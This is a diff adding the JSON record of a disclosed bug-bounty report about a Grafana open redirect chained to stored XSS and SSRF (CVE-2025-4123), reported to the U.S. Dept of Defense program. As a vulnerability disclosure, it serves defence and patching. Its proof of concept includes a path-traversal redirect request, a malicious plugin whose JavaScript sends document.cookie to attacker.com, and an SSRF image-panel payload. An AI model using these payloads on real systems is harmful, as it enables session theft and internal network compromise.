@@ -1,0 +1,121 @@
+{
+  "id": 3286945,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjg2OTQ1",
+  "url": "https://hackerone.com/reports/3286945",
+  "title": "CVE‑2025‑4123 — Grafana Open Redirect → Stored XSS → SSRF (Full Read) at ██████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2025-08-05T13:15:41.536Z",
+  "submitted_at": "2025-08-05T13:15:41.634Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "khoof",
+    "url": "/khoof",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/lrfal34c5mh7fmtv2vvfwmsnnwty/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2025-4123",
+    "CVE-2025-3580"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-01-12T19:49:56.277Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-08-20T11:13:35.603Z",
+  "team_member_agreed_on_going_public_at": "2026-01-12T19:49:55.977Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "##  Summary\n\n**CVE‑2025‑4123** is a high‑severity vulnerability in **Grafana OSS and Enterprise** that allows unauthenticated attackers to chain multiple flaws:\n\n* **Open Redirect** via path traversal in the public redirect handler.\n* **Stored XSS** through malicious plugin injection.\n* **Full‑read SSRF** if the Grafana Image Renderer plugin is installed.\n\nThis can lead to **account takeover, data theft, and internal network compromise**.\n\n---\n\n## 3. Affected Products\n\n* Grafana OSS & Enterprise **8.x through 12.x**\n* **Not affected**: Grafana Cloud (managed service)\n* **Vulnerable configurations**:\n\n  * Anonymous access enabled\n  * Image Renderer plugin installed\n  * Outbound egress to the internet is allowed\n\n---\n\n## 4. CVSS Score\n\n**CVSS v3.1:** 7.6 (High)\n**Vector:** AV\\:N/AC\\:L/PR\\:N/UI\\:R/S\\:U/C\\:H/I\\:L/A\\:L\n\n---\n\n## 5. Technical Details\n\n### 5.1 Root Cause\n\nThe `/public/redirect` endpoint in Grafana fails to validate and sanitize redirect targets. Combined with plugin auto‑loading from external sources, this allows loading untrusted JavaScript into the Grafana origin context.\n\n---\n\n### 5.2 Exploit Flow\n\n**Step 1 — Open Redirect**\nThe attacker crafts a URL to the public endpoint with a path traversal pattern:\n\n```\nhttps://<victim-domain>/public/..%2F%5█████%2F%3f%2F..%2F..\n```\n\nExample from testing:\n\n```\n██████████\n```\n\n\n█████\n\nThis causes the server to redirect to `██████████` (or attacker-controlled domain).\n\n---\n\n**Step 2 — Host Malicious Plugin**\n\n1. Attacker sets up a fake Grafana plugin repository with:\n\n   * `plugin.json`\n   * `malicious.js` (steals cookies, executes admin actions)\n2. The victim is redirected to this plugin via the vulnerable endpoint.\n\n---\n\n**Step 3 — Stored XSS**\n\n* Grafana loads the plugin and executes attacker‑supplied JavaScript in the victim’s browser under the **trusted Grafana origin**.\n* This can steal:\n\n  * Session tokens\n  * API keys\n  * User credentials\n  * Dashboard data\n\n---\n\n**Step 4 — SSRF (Optional)**\nIf the **Image Renderer plugin** is installed:\n\n* Attacker uses crafted image URLs pointing to internal services (e.g., `████`).\n* Grafana fetches the content, sending it back to the attacker.\n* This can expose **AWS credentials** or sensitive internal API data.\n\n---\n\n## 6. Proof of Concept (PoC)\n\n### 6.1 Open Redirect\n\n```\nGET /public/..%2F%5█████████%2F%3f%2F..%2F.. HTTP/1.1\nHost: ████████\nUser-Agent: Mozilla/5.0\nAccept: */*\n```\n\n**Expected behavior:** Redirect to `https://███████/`\n\n---\n\n### 6.2 Stored XSS via Malicious Plugin\n\n1. Create `plugin.json`:\n\n```json\n{\n  \"type\": \"panel\",\n  \"name\": \"Evil Plugin\",\n  \"id\": \"evil.plugin\",\n  \"includes\": [],\n  \"scripts\": [\"malicious.js\"]\n}\n```\n\n2. Create `malicious.js`:\n\n```javascript\nalert(\"XSS - Session: \" + document.cookie);\n// exfiltration to attacker server\nfetch(\"https://attacker.com/log?c=\" + encodeURIComponent(document.cookie));\n```\n\n3. Redirect victim to:\n\n```\n██████████\n```\n\n---\n\n### 6.3 SSRF (Full Read)\n\nIf Image Renderer is enabled:\n\n```json\n{\n  \"dashboard\": {\n    \"panels\": [\n      {\n        \"type\": \"image\",\n        \"url\": \"█████████\"\n      }\n    ]\n  }\n}\n```\n\nRenderer fetches internal metadata → credentials leaked.\n\n---\n\n## 7. Impact\n\n* **Account takeover** (including admin accounts)\n* **Persistent compromise** of the Grafana instance\n* **Internal network access**\n* **Cloud service compromise** if SSRF exploited in AWS/GCP/Azure\n\n---\n\n## 8. Mitigation\n\n**Patch immediately** to:\n\n* `10.4.18+security-01`\n* `11.2.9+security-01`\n* `11.3.6+security-01`\n* `11.4.4+security-01`\n* `11.5.4+security-01`\n* `11.6.1+security-01`\n* `12.0.0+security-01`\n\n**Configuration:**\n\n* Disable anonymous access:\n\n```ini\n[auth.anonymous]\nenabled = false\n```\n\n* Restrict plugin loading to signed plugins only\n* Enable strict CSP:\n\n```ini\ncontent_security_policy = true\n```\n\n* Remove Image Renderer if not required\n* Restrict outbound egress to trusted domains only\n\n---\n\n## 9. Detection\n\nLook for:\n\n* `/public/` requests with encoded `..%2F` patterns\n* Unrecognized plugin loads in logs\n* Unexpected external connections from Grafana server\n\nExample log match:\n\n```\nt=2025-08-05 lvl=info msg=\"Request Completed\" logger=context userId=0 method=GET path=/public/..%2F\n```\n\n---\n\n## 10. References\n\n* [Grafana Security Advisory — CVE‑2025‑4123](https://grafana.com/blog/2025/05/23/grafana-security-release-medium-and-high-severity-security-fixes-for-cve-2025-4123-and-cve-2025-3580/)\n* [NVD — CVE‑2025‑4123](████)\n* [Indusface Analysis](████)\n* [Ionix.io Technical Breakdown](████████)\n* [Wiz.io Vulnerability DB Entry](██████)\n\n\n\n\n\n\n---\n\n**Note:**\nDuring testing, we successfully exploited the **Open Redirect** vector using the payload:\n\n```\n███\n```\n\nThe XSS and SSRF chains described above were **not fully executed** in this assessment due to the number of required setup steps and environmental constraints.\nHowever, the confirmed open redirect behavior **validates the presence of CVE‑2025‑4123** in the target, as it is a core prerequisite for achieving the documented full‑chain exploitation.\n\n\n\n## System Host(s)\n████████\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
+  "weakness": {
+    "id": 53,
+    "name": "Open Redirect"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 15,
+  "voters": [
+    "mohaned0101",
+    "sisi0x",
+    "khoof",
+    "0xsom3a",
+    "mozaaaaa",
+    "0xkarim_dix",
+    "lucasfutures",
+    "elfeki_24",
+    "1diego1d",
+    "l14h",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
